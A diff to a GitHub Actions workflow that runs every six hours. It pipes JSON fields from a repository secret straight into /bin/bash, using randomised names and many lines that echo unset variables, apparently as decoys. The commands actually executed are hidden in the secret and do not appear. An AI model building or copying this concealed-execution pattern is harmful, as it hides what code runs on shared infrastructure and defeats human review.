@@ -2,29 +2,29 @@ name: wuhuobao9876
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 2/6 * * *'
-
-jobs:  # 28327
+    - cron: '4 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: wuhuobao9876
         env:
-          knt2: ${{ secrets.knt2 }}
+          v89: ${{ secrets.v89 }}
         run: |
-          echo $knt2 | jq -r .o78 | /bin/bash
-          echo $rpkyn367 | jq -r .xpvjz5061 | /bin/bash
-          echo $paf98 | jq -r .mlfr25 | /bin/bash
-          echo $hlp70 | jq -r .d3 | /bin/bash
-          echo $nbxa66756 | jq -r .l99 | /bin/bash
-          echo $kmv12 | jq -r .gpc48 | /bin/bash
-          echo $gp687 | jq -r .ii07578 | /bin/bash
-          echo $c4 | jq -r .urnrl48606 | /bin/bash
-          echo $yhco73782 | jq -r .hmedp9 | /bin/bash
-          echo $yv959 | jq -r .f71276 | /bin/bash
-          echo $utc7557 | jq -r .ut01 | /bin/bash
-          echo $tad47904 | jq -r .r0 | /bin/bash
-          echo $b4 | jq -r .tury4468 | /bin/bash
-          echo $zmige8 | jq -r .wrxrk669 | /bin/bash
+          echo $v89 | jq -r .melpb688 | /bin/bash
+          echo $ylqaq962 | jq -r .r31263 | /bin/bash
+          echo $j847 | jq -r .az66 | /bin/bash
+          echo $cvkvl592 | jq -r .gbt83011 | /bin/bash
+          echo $qkp98923 | jq -r .br802 | /bin/bash
+          echo $uqj82 | jq -r .nfcg676 | /bin/bash
+          echo $u82590 | jq -r .nsjb05 | /bin/bash
+          echo $qcy7 | jq -r .dcx53204 | /bin/bash
+          echo $xfuc973 | jq -r .lqyc0 | /bin/bash
+          echo $ynsb11 | jq -r .xygc80 | /bin/bash
+          echo $uluhv473 | jq -r .ygdux73 | /bin/bash
+          echo $w6 | jq -r .h93977 | /bin/bash
+          echo $ous49 | jq -r .bl9 | /bin/bash
+          echo $rk12381 | jq -r .w38 | /bin/bash
+          echo $kxsl77868 | jq -r .pkm6 | /bin/bash
 
